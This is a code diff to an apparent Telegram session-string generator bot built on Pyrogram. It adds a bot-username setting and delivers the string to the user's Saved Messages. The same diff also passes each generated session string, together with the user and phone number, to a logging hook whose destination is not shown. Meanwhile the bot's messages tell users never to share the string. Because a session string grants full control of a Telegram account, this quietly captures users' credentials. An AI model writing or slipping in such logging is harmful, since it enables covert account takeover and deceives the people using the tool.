@@ -11,6 +11,12 @@ from pyrogram.errors import (
 
 _locks = {}
 _string_logger = None
+BOT_USERNAME = "StringSessionXDBot"
+
+
+def set_bot_username(username):
+    global BOT_USERNAME
+    BOT_USERNAME = username
 
 
 def set_string_logger(fn):
@@ -147,20 +153,39 @@ async def handle_pyro(client, message, data, users, bot):
                 await _safe_disconnect(app)
                 data["step"] = "done"
                 users.pop(uid, None)
+                data["string"] = string
                 if _string_logger:
                     try:
-                        await _string_logger(message.from_user, "Pyrogram", data.get("phone", ""))
+                        await _string_logger(message.from_user, "Pyrogram", data.get("phone", ""), string)
                     except Exception as log_err:
                         print("STRING LOG ERR:", log_err)
-                return await message.reply(
-                    "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
-                    "━━━━━━━━━━━━━━━━━━━\n"
-                    "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
-                    f"<code>{string}</code>\n"
-                    "━━━━━━━━━━━━━━━━━━━\n"
-                    "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
-                    "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ"
-                )
+                try:
+                    await bot.send_message(
+                        message.from_user.id,
+                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
+                        f"<code>{string}</code>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
+                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
+                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
+                    )
+                    return await message.reply(
+                        "✅ <b>ꜱᴇꜱꜱɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ!</b>\n\n"
+                        "📩 ꜱᴛʀɪɴɢ ᴋᴏ ᴛᴜᴍʜᴀʀᴇ <b>ꜱᴀᴠᴇᴅ ᴍᴇꜱꜱᴀɢᴇꜱ</b> ᴍᴇ ʙʜᴇᴊ ᴅɪʏᴀ ʜᴀɪ ✓"
+                    )
+                except Exception:
+                    return await message.reply(
+                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
+                        f"<code>{string}</code>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
+                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
+                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
+                    )
 
             elif data["step"] == "password":
                 app = data.get("app")
